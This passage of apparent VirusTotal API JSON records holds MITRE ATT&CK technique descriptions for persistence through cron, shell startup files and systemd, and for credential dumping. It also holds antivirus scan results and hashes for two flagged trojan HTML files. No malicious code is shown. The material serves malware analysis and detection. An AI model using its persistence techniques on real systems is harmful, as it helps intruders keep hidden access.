                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Executes the \"crontab\" command typically for achieving persistence"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/",
                "id": "T1053",
                "name": "Scheduled Task/Job"
              },
              {
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. \nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using /etc/profile"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1546/004/",
                "id": "T1546.004",
                "name": "Unix Shell Configuration Modification"
              },
              {
                "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \nSystemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME). \nInside the .service unit files, the following directives are used to execute commands:  \n\nExecStart, ExecStartPre, and ExecStartPost directives execute when a service is started manually by systemctl or on system start if the service is set to automatically start.\nExecReload directive executes when a service restarts. \nExecStop, ExecStopPre, and ExecStopPost directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a .service file’s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"systemctl\" command used for controlling the systemd system and service manager"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/002/",
                "id": "T1543.002",
                "name": "Systemd Service"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Enumerates processes within the \"proc\" file system"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1003/",
                "id": "T1003",
                "name": "OS Credential Dumping"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f1d534efb2fbeeb5720a"
  },
  "data": {
    "attributes": {
      "type_description": "unknown",
      "type_tags": [],
      "names": [
        "aa",
        "kPXn8HvBX.kwu",
        "M1aDRKKDxe.tmp"
      ],
      "last_modification_date": 1706322032,
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 7794,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.fakeplayer",
        "popular_threat_category": [
          {
            "count": 6,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 10,
            "value": "fakeplayer"
          }
        ]
      },
      "last_submission_date": 1292907277,
      "last_analysis_results": {
        "nProtect": {
          "category": "malicious",
          "engine_name": "nProtect",
          "engine_version": "2010-12-20.01",
          "result": "Trojan.FakePlayer.A",
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "11.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "5.400.0.1158",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "9.73.3296",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "TheHacker": {
          "category": "undetected",
          "engine_name": "TheHacker",
          "engine_version": "6.7.0.1.103",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "VirusBuster": {
          "category": "undetected",
          "engine_name": "VirusBuster",
          "engine_version": "13.6.104.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "NOD32": {
          "category": "undetected",
          "engine_name": "NOD32",
          "engine_version": "5719",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "F-Prot": {
          "category": "undetected",
          "engine_name": "F-Prot",
          "engine_version": "4.6.2.117",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "20101.3.0.103",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Norman": {
          "category": "malicious",
          "engine_name": "Norman",
          "engine_version": "6.06.12",
          "result": "HTML/Agent.CU",
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "9.120.0.1004",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "4.8.1351.0",
          "result": "HTML:FakePlayer-A",
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "eSafe": {
          "category": "undetected",
          "engine_name": "eSafe",
          "engine_version": "7.0.17.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101219"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "0.96.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "7.0.0.125",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.FakePlayer.A",
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "4.40.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "5.1.0.1",
          "result": "Trojan.FakePlayer!IK",
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Comodo": {
          "category": "undetected",
          "engine_name": "Comodo",
          "engine_version": "7134",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "9.0.16160.0",
          "result": "Trojan.FakePlayer.A",
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "5.0.2.03300",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "7742",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "AntiVir": {
          "category": "malicious",
          "engine_name": "AntiVir",
          "engine_version": "7.11.0.110",
          "result": "PHISH/FakePlayer.A",
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "9.120.0.1004",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "McAfee-GW-Edition": {
          "category": "undetected",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "2010.1C",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "4.60.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "eTrust-Vet": {
          "category": "malicious",
          "engine_name": "eTrust-Vet",
          "engine_version": "36.1.8051",
          "result": "HTML/FakePlayer.A",
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "13.0.900",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "Command": {
          "category": "undetected",
          "engine_name": "Command",
          "engine_version": "5.2.11.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "2.0.3.7",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.6402",
          "result": "Trojan:HTML/Fakeplayer.A",
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2010.12.20.4210",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Prevx": {
          "category": "undetected",
          "engine_name": "Prevx",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "2010.12.20.06",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "3.12.14.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "PCTools": {
          "category": "undetected",
          "engine_name": "PCTools",
          "engine_version": "7.0.3.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "22.79.00.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "T3.1.1.90.0",
          "result": "Trojan.FakePlayer",
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "4.2.254.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101219"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "9.0.0.851",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101221"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "10.0.2.7",
          "result": null,
          "method": "blacklist",
          "engine_update": "20101220"
        },
        "Avast5": {
          "category": "malicious",
          "engine_name": "Avast5",
          "engine_version": "5.0.677.0",
          "result": "HTML:FakePlayer-A",
          "method": "blacklist",
          "engine_update": "20101220"
        }
      },
      "trid": [
        {
          "file_type": "HyperText Markup Language with DOCTYPE",
          "probability": 80.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 19.3
        }
      ],
      "sha256": "e23b5cad5614b9b87f69b9642d36003102aaf39c9a297da3500ba632854b067d",
      "tags": [],
      "last_analysis_date": 1292907277,
      "unique_sources": 1,
      "first_submission_date": 1292907277,
      "ssdeep": "192:qaZ+sSN9aY29LTpUEd2K4TUueZo2GJtkv19QB++stmhHYNFiINuGVaYRQ:qaZTOqTpUEd2/QueZSJtkv19D+stqHY0",
      "md5": "79026b9ce40c559bed352919543f60fb",
      "sha1": "09aff47aac8d775325a08060d26f4d9cc5666b81",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 0,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 11,
        "undetected": 31
      },
      "meaningful_name": "kPXn8HvBX.kwu",
      "reputation": -7
    },
    "type": "file",
    "id": "e23b5cad5614b9b87f69b9642d36003102aaf39c9a297da3500ba632854b067d",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/e23b5cad5614b9b87f69b9642d36003102aaf39c9a297da3500ba632854b067d"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f20f34efb2fbeeb57214"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "tlsh": "T17A12D8BEEA10BD1BC143EB2575E1FB240D1776D0CAE5B8C960D6C41BB184D846570FCA",
      "vhash": "htm:ad27fe3d2999a8e43c5960c6eb41a871",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [
        "symbian-phone.php"
      ],
      "last_modification_date": 1706322499,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 9584,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.iframeref",
        "popular_threat_category": [
          {
            "count": 17,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 3,
            "value": "iframeref"
          }
        ]
      },
      "html_info": {
        "html_meta": {
          "description": [
            "This website provides detailed information on symbian phone."
          ]
        },
        "hrefs": [
          "http://www.smspoint.biz",
          "http://www.google.com/",
          "http://www.kolkataclassifieds.com",
          "http://www.siemenssx1.com/",
          "http://www.handango.com/",
          "http://news.com.com/2100-1041-992763.html",
          "http://www.symbian.com/technology/symbos-phones.html",
          "http://www.theregister.co.uk/content/54/20089.html",
          "http://www.theregister.co.uk/content/68/33508.html",
          "http://www.infoworld.com/article/03/10/22/HNsendophone_1.html",
          "http://www.infoworld.com/article/03/12/19/HNnttlinuxphone_1.html",
          "http://www.symmobile.com/",
          "http://www.symbian.com/",
          "http://www.mmspoint.info",
          "index2.php",
          "http://www.tirupati.biz",
          "mailto:sales@smspoint.biz",
          "http://www.placementguide.com",
          "http://www.stunicom.com",
          "http://www.onlinemarketingpoint.com",
          "http://www.sensual-saree-wearing.com",
          "http://www.classroomseries.com",
          "http://www.articlespoint.com",
          "http://www.searchenginepoint.com",
          "http://www.onlycds.com"
        ],
        "scripts": [
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "5917922b3e68cbe52d247efd882e28483fb2081971bf8cd3d01ac0be8eb790b0"
          },
          {
            "attributes": {
              "src": "http://pagead2.googlesyndication.com/pagead/show_ads.js",
              "type": "text/javascript"
            },
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
          },
          {
            "attributes": {
              "language": "javascript"
            },
            "sha256": "9296425034c6ca8da27ee6ef2f1ebda53305af6301487b20926f617fbaf9982c"
          }
        ],
        "title": "Symbian Phone"
      },
      "last_submission_date": 1691040658,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.HTML.Iframe.4!c",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.103",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230801"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.JS.Agent.GDG",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.1.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.JS.Agent.GDG",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "HTML.Phishing.43836",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.JS.Agent.GDG",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230724"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.105.49171",
          "result": "Exploit ( 04c55e2a1 )",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.105.49170",
          "result": "Exploit ( 04c55e2a1 )",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Baidu": {
          "category": "malicious",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": "HTML.Trojan.Iframe.br",
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.506",
          "result": "JS.Agent.DH",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Cyren": {
          "category": "malicious",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": "IFrame.gen",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "IFrame.Exploit",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "27684",
          "result": "JS/Iframe.OL",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.440",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.8.8378.0",
          "result": "HTML:Iframe-inf [Susp]",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Kaspersky": {
          "category": "failure",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.JS.Agent.GDG",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Script.Iframe.cmxhms",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "JS.Z.Agent.9584",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Exploit.IframeRef!8.38B (TOPIS:E0:Kros6LvpJwU)",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": "Mal/Iframe-F",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": "Malware.JS/IFrame.115548",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.60.6220",
          "result": "Trojan.Click.18167",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4931",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.HTML.IFrame115548.zq",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.90",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230718"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230619"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.JS.Agent.GDG (B)",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.1.14.0",
          "result": "Trojan.IframeRef",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "230804-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "JS/IFrame.115548",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan[Infect]/JS.Agent",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23060.1005",
          "result": "Exploit:HTML/IframeRef.T",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.131.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "35883",
          "result": "TrojWare.HTML.Iframe.K@4t51bv",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.JS.Agent.GDG [many]",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36314B:27.32657",
          "result": "Trojan.JS.Agent.GDG (3x)",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1691150429",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230801"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.119",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230727"
        },
        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": "Trojan-Clicker.HTML.IFrame.gen",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.JS.Agent.GDG",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-08-04.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230726"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Html.Win32.Script.1501058",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=87)",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
